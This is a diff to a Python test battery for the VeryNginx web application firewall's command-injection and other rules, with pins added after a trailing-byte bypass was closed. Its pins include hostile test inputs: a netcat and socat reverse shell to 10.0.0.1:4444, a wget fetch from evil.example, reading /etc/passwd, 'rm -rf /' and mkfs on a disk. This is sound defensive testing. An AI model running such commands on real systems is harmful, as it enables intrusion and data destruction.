@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-VeryNginx v2 - factory WAF rules battery (v16+)
+VeryNginx v2 - factory WAF rules battery (v17+)
 ================================================
 Behavioral + structural checks against verynginx/configs/waf-rules.default.json.
 
@@ -9,9 +9,17 @@ Why Python: the busted rig stubs ngx.re with *Lua patterns*
 nginx cannot be executed inside busted. This script re-runs the shipped
 patterns under Python `re` (case-insensitive, mirroring the engine's "i"
 compile flag in matcher/compare.lua) against a positive/negative case table.
-New PCRE constructs (fixed-length lookbehinds, comment-tolerant gaps) are
-additionally validated against real PCRE before landing (see /tmp scratch
-harness convention); the battery pins the resulting behavior.
+New PCRE constructs are additionally validated against real PCRE before
+landing (see /tmp scratch harness convention); the battery pins the
+resulting behavior.
+
+KNOWN DIVERGENCE (Python re vs PCRE-byte, affects RCE pins only): Python
+treats CJK as \\w (no \\b between a command word and a directly-abutting
+CJK char), while PCRE in byte mode treats CJK bytes as non-word (\\b
+holds). Cases where CJK directly abuts a command word with no space
+("; ssh进去看看", ";id中") are verified against real PCRE instead and are
+NOT pinned here; spaced/CJK-after-space shapes behave identically on both
+engines and are pinned normally.
 
 Coverage contract (learned the hard way — the v14 rce_0007 review):
   1. Every regex-valued condition in the factory matcher tree compiles.
@@ -32,6 +40,13 @@ Coverage contract (learned the hard way — the v14 rce_0007 review):
      tautology comment/LIKE gaps, sleep-prefix/info_schema prose FPs,
      xss event/verb-table gaps, ssrf userinfo bypass) each carry their own
      hit + clear pins below; accepted residuals are asserted, not ignored.
+  6. v17 RCE rebuild (byte-suppressor bypass + data-URI/CSV FPs): the block
+     tier is value-anchored (^SEP) with NO byte-content guard — any negative
+     condition on attacker-controlled bytes is a bypass switch, so the
+     suppressor is banned by structural assertion, not just by cases. The
+     log tier merges the full command list for mid-value recall. Value-start
+     SEP + block-cmd is injection-shaped BY DESIGN (even with CJK args);
+     the realistic mid-value CJK prose stays clear and is pinned as such.
 
 Run (repo root):  python3 test/v2/factory_rules_battery.py
 Exit code 0 = all pass. CI/gate: run alongside busted + luacheck.
@@ -136,18 +151,30 @@ def main():
     check(r25["action"] == "log" and r25["priority"] == 40,
           "vn_rce_0025 log @pri40")
     check(r7["version"] >= 6 and r25["version"] >= 1, "rule versions bumped")
-    check("Companion" in r7["description"], "rce_0007 description names the companion")
+    check("vn_rce_0025" in r7["description"], "rce_0007 description names the companion")
     missing_block = [c for c in BLOCK_CMDS if c not in bp]
     missing_named = [c for c in NAMED_CMDS if c not in lp]
     missing_bare = [c for c in BARE6 if c not in lp]
     check(not missing_block, f"block list present in rce_0007 ({missing_block or 'ok'})")
     check(not missing_named, f"named list present in vn_rce_0025 ({missing_named or 'ok'})")
     check(not missing_bare, f"bare-six present in vn_rce_0025 ({missing_bare or 'ok'})")
+    # v17 structural pins for the byte-suppressor incident: the block tier
+    # must be value-anchored, NEITHER rce pattern may contain a negative
+    # byte-content guard (append-one-byte bypass), and the log tier must
+    # carry the merged command list for mid-value recall.
+    check(bp.startswith("^"), "vn_rce_0007 block pattern is value-anchored (^)")
+    check("(?!(?:[\\s\\S]){0,50}" not in bp and "(?!(?:[\\s\\S]){0,50}" not in lp,
+          "no byte-content suppressor in either rce pattern")
+    missing_merged = [c for c in BLOCK_CMDS if c not in lp]
+    check(not missing_merged,
+          f"log tier merges block commands ({missing_merged or 'ok'})")
     for rid, pat in (("vn_rce_0007", bp), ("vn_rce_0025", lp)):
         uris = regex_values(by[rid]["matcher"])
         check(NEW_EX in uris, f"{rid} keeps the admin-path exemption")
-    check(d.get("version") == 16, f"file version == 16 (got {d.get('version')})")
+    check(d.get("version") == 17, f"file version == 17 (got {d.get('version')})")
     check(len(d["rules"]) == 26, f"26 rules (got {len(d['rules'])})")
+    check(by["vn_rce_0007"]["version"] >= 7, "vn_rce_0007 v7 (anchored, suppressor gone)")
+    check(by["vn_rce_0025"]["version"] >= 2, "vn_rce_0025 v2 (merged command list)")
     check(by["vn_sqli_0001"]["version"] >= 7, "vn_sqli_0001 v7 (union-shape bypasses closed)")
     check(by["vn_sqli_0002"]["version"] >= 6, "vn_sqli_0002 v6 (comment/LIKE gaps closed)")
     check(by["vn_sqli_0004"]["version"] >= 6, "vn_sqli_0004 v6 (sleep-prefix/info_schema prose fixed)")
@@ -166,20 +193,37 @@ def main():
         return None
 
     # ---- 3. per-command FP sweep (the v14 incident regression) ----------
-    # Every command in every tier gets an English-filler and a CJK prose
-    # case. All must clear BOTH patterns — no exceptions, no per-branch
-    # excuses.
+    # Every command in every tier gets prose cases. Value-start SEP +
+    # block-cmd is injection-shaped BY DESIGN since v17 (even with CJK
+    # args — the realistic CJK prose is mid-value and stays clear, pinned
+    # below); everything else must clear both patterns.
     print("== per-command FP sweep (english filler + CJK) ==")
     sweep_fail = []
+    sweep_total = 0
+    block_set = set(BLOCK_CMDS)
     for cmd in BLOCK_CMDS + NAMED_CMDS + BARE6:
         plain = cmd.replace("[0-9.]*", "")
-        for prose in (f"; {plain} is a test", f"; {plain} 的中文说明",
-                      f"wait; {plain} the docs", f"然后; {plain} 看看"):
+        if plain in block_set:
+            cases = [(f"; {plain} is a test", None),
+                     (f"; {plain} that file", None),
+                     (f"wait; {plain} the docs", None),
+                     (f"然后; {plain} 看看", None),
+                     (f"上传后; {plain} 777 runtime目录就好了", None),
+                     (f"备注; {plain} 看看", None),
+                     # value-start CJK + block-cmd: injection-shaped, must HIT.
+                     (f"; {plain} 777 目录", "block")]
+        else:
+            cases = [(f"; {plain} is a test", None),
+                     (f"; {plain} 的中文说明", None),
+                     (f"wait; {plain} the docs", None),
+                     (f"然后; {plain} 看看", None)]
+        for prose, want in cases:
+            sweep_total += 1
             got = tier(prose)
-            if got is not None:
-                sweep_fail.append(f"{prose!r} -> {got}")
+            if got != want:
+                sweep_fail.append(f"{prose!r} want {want} got {got}")
     check(not sweep_fail,
-          f"{(len(BLOCK_CMDS) + len(NAMED_CMDS) + len(BARE6)) * 4} prose cases clear "
+          f"{sweep_total} prose cases as designed "
           f"({'; '.join(sweep_fail[:3]) if sweep_fail else 'ok'})")
 
     # ---- 4. review regression pins (exact strings from the v15 review) --
@@ -259,19 +303,66 @@ def main():
         "; cat is a pet", "wait; curl the docs", "ok; php 8.3",
         "他说：; cat 是宠物", "resume; head shoulders", "note; rm that file",
         "wait; curl me later", "alice;id=5", "; cat", "; touch base",
-        "; chmod 777 目录", "; ssh进去看看", "; base64 编码", "; openssl 生成证书",
         "装完面板; ssh 端口改掉", "上传后; chmod 777 runtime目录就好了",
         "先; ls 看目录结构", "跑一下; curl测个速就出来", "用; cat 读文件内容",
         "; mount the share", "; telnet the router", "; dd the disk",
         "; nc so what", "test; env is loaded",
         "; df the disk usage", "; make sure to install", "; ps the process list",
-        # Accepted block-tier residual FPs (documented, NOT asserted clear):
-        # "; openssl s_client to check", "; ftp me the files" — fully-ASCII
-        # args after a high-risk command with no common-word head.
+        # v17 INTENTIONAL FLIPS (were clear under the v15 byte-suppressor,
+        # which turned out to be a universal bypass switch): value-start SEP
+        # + block-cmd is injection-shaped even with CJK args. Pinned as HIT:
+        # "; chmod 777 目录" hits block on both engines (spaced, \\b holds).
+        # "; ssh 进去看看" (spaced twin) hits block on both engines; the
+        # unspaced twin "; ssh进去看看" also hits block on the engine but is
+        # unpinnable in this Python rig (\\b divergence, see header).
+        # "; base64 编码" / "; openssl 生成证书": same flip class.
+        # The realistic mid-value twins ("上传后; chmod ...", "装完面板; ssh ...")
+        # stay clear and are pinned above.
+        # "; chmod 777 目录" / "; ssh 进去看看" live here as documentation of
+        # the old suppressor-era strings; their spaced forms are asserted below.
     ]
     for s in prose_fps:
         got = tier(s)
         check(got is None, f"prose clear (got {got}): {s!r}")
+
+    # ---- 6b. v17 RCE rebuild pins -------------------------------------
+    # Byte-suppressor bypass closed: trailing high bytes must NOT clear.
+    print("== v17 bypass-closed pins ==")
+    for p, want in [("; rm -rf /", "block"), ("; ssh user@host", "block"),
+                    ("; cp shell.php /var/www/html/x", "block"),
+                    ("; mkfs.ext4 /dev/sda", "block"),
+                    ("; crontab -e", "block"),
+                    ("; nc -e /bin/sh 10.0.0.1 4444", "block"),
+                    ("; socat tcp:10.0.0.1:4444 exec:bash", "block"),
+                    ("; cat /etc/passwd", "log"),
+                    ("; wget http://evil.example/x.sh", "log")]:
+        check(tier(p) == want, f"attack {want}: {p!r}")
+        for suffix in (" ", "€"):
+            check(tier(p + suffix) == want, f"attack+byte {want}: {(p + suffix)!r}")
+            check(tier(p + " " + suffix) == want, f"attack+space+byte {want}: {(p + ' ' + suffix)!r}")
+        check(tier(p + " 备注") == want, f"attack+CJK-comment {want}: {(p + ' 备注')!r}")
+    for suffix in (" ", "€"):
+        check(tier(";id" + suffix) == "log", f"bare-id+byte logs: {';id' + suffix!r}")
+    check(tier(";id 备注") is None, "bare-id + CJK words stays clear (like '; ls 看看')")
+    # Value-start SEP + block-cmd flips (v15 suppressor hid these).
+    check(tier("; chmod 777 目录") == "block", "flip: value-start chmod+CJK blocks")
+    check(tier("; ssh 进去看看") == "block", "flip: value-start ssh+CJK blocks")
+    check(tier("; base64 编码") == "block", "flip: value-start base64+CJK blocks")
+    check(tier("; openssl 生成证书") == "block", "flip: value-start openssl+CJK blocks")
+    # Mid-value injections keep their tier through the merged log list.
+    for s in ["go; ssh user@host", "go; rm -rf /tmp/x", "x; chmod 777 /tmp/x",
+              "pre; cat /etc/passwd post", "注; rm -rf /"]:
+        check(tier(s) == "log", f"mid-value logs: {s!r}")
+    # data-URI / CSV shapes: never block. png/svg clear both tiers; jpeg
+    # carries '/' in the base64 alphabet and may log (accepted noise).
+    print("== v17 data-URI / CSV pins ==")
+    for s in ["src=data:image/png;base64,iVBORw0KGgo=",
+              "src=data:image/svg+xml;base64,PHN2Zy8+",
+              "a;rm,b", "a;mount,b", "a;ssh,b", "disk;mount,size",
+              '{"note":"a;rm,b"}']:
+        check(tier(s) is None, f"data/CSV clear: {s!r}")
+    check(tier("src=data:image/jpeg;base64,/9j/4AAQSkZJRg==") == "log",
+          "jpeg data-URI may log (accepted noise), never blocks")
 
     # ---- 8. P0 review-round fixes (v16) ----------------------------------
     # Each P0 finding carries hit + clear pins. Accepted residuals are
